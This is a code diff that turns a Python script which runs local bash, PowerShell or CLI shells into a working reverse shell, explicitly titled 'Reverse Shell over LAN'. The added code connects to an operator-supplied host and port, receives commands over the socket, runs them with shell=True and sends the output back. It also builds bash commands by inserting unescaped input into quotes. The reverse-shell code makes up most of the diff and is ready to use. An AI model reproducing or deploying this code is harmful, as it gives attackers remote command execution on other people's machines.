@@ -1,91 +1,55 @@
-import argparse
+import socket
 import subprocess
-import sys
+import argparse
 
+def connect_to_server(host, port, shell_type):
+    try:
+        # Create a socket
+        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        client_socket.connect((host, port))
+        print(f"Connected to {host}:{port}")
 
-def start_cli_shell():
-    """Starts a Python CLI shell."""
-    print("Entering Python CLI shell (type 'exit' to quit)")
-    while True:
-        try:
-            command = input("cli> ").strip()
+        # Interactive shell loop
+        while True:
+            client_socket.send(f"{shell_type}> ".encode())
+            command = client_socket.recv(1024).decode().strip()
+
             if command.lower() in {"exit", "quit"}:
-                print("Exiting CLI shell.")
+                print("Connection closed by server.")
                 break
-            if command:
-                result = subprocess.run(command, shell=True, text=True, capture_output=True)
-                print(result.stdout, end="")
-                if result.stderr:
-                    print(result.stderr, end="")
-        except KeyboardInterrupt:
-            print("\nExiting CLI shell.")
-            break
-        except Exception as e:
-            print(f"Error: {e}")
 
+            if shell_type == "bash":
+                command = f"bash -c '{command}'"
+            elif shell_type == "powershell":
+                command = f"powershell -Command {command}"
+            
+            try:
+                # Execute the command
+                result = subprocess.run(command, shell=True, capture_output=True, text=True)
+                output = result.stdout + result.stderr
+            except Exception as e:
+                output = f"Error executing command: {e}"
 
-def start_bash_shell():
-    """Starts a Bash shell."""
-    print("Entering Bash shell (type 'exit' to quit)")
-    while True:
-        try:
-            command = input("bash> ").strip()
-            if command.lower() in {"exit", "quit"}:
-                print("Exiting Bash shell.")
-                break
-            if command:
-                result = subprocess.run(["bash", "-c", command], text=True, capture_output=True)
-                print(result.stdout, end="")
-                if result.stderr:
-                    print(result.stderr, end="")
-        except KeyboardInterrupt:
-            print("\nExiting Bash shell.")
-            break
-        except Exception as e:
-            print(f"Error: {e}")
+            if not output:
+                output = "[No output]\n"
 
-
-def start_powershell_shell():
-    """Starts a PowerShell shell."""
-    print("Entering PowerShell shell (type 'exit' to quit)")
-    while True:
-        try:
-            command = input("ps> ").strip()
-            if command.lower() in {"exit", "quit"}:
-                print("Exiting PowerShell shell.")
-                break
-            if command:
-                result = subprocess.run(["powershell", "-Command", command], text=True, capture_output=True)
-                print(result.stdout, end="")
-                if result.stderr:
-                    print(result.stderr, end="")
-        except KeyboardInterrupt:
-            print("\nExiting PowerShell shell.")
-            break
-        except Exception as e:
-            print(f"Error: {e}")
+            client_socket.send(output.encode())
+    except Exception as e:
+        print(f"Error: {e}")
+    finally:
+        client_socket.close()
 
 
 def main():
-    parser = argparse.ArgumentParser(description="Reverse Shell CLI")
-    parser.add_argument(
-        "--shell",
-        choices=["cli", "bash", "powershell"],
-        required=True,
-        help="Choose the type of shell to run (cli, bash, powershell)"
-    )
+    parser = argparse.ArgumentParser(description="Reverse Shell over LAN")
+    parser.add_argument("--host", required=True, help="The IP address of the server to connect to")
+    parser.add_argument("--port", type=int, required=True, help="The port of the server to connect to")
+    parser.add_argument("--shell", choices=["cli", "bash", "powershell"], required=True, help="Type of shell to use")
     args = parser.parse_args()
 
-    if args.shell == "cli":
-        start_cli_shell()
-    elif args.shell == "bash":
-        start_bash_shell()
-    elif args.shell == "powershell":
-        start_powershell_shell()
-    else:
-        print("Invalid shell type selected.")
-        sys.exit(1)
+    connect_to_server(args.host, args.port, args.shell)
 
 
 if __name__ == "__main__":
     main()
+
